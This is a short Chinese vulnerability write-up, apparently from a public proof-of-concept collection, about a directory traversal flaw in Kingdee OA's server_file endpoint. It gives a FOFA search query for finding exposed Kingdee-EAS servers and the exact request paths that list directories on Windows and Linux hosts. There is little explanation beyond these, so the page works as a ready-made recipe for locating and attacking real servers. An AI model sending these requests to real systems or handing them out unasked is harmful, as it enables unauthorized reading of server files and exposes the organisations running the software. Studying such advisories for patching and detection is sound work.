# 金蝶OA-server_file-目录遍历漏洞

## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息

## 漏洞影响

> [!NOTE]
>
> 金蝶OA

## FOFA

> [!NOTE]
>
> app="Kingdee-EAS"

## 漏洞复现

登录界面为

![image-20210603132948792](金蝶OA-server_file-目录遍历漏洞.assets/1627363503963486.jpg)

漏洞POC

```
/appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

![image-20210603133022065](C:/Users/peiqi/AppData/Roaming/Typora/typora-user-images/image-20210603133022065.png)

```
Windows服务器

appmonitor/protected/selector/server_file/files?folder=C://&suffix=

Linux服务器
appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

![image-20210603133136331](金蝶OA-server_file-目录遍历漏洞.assets/1627363504215456.jpg)

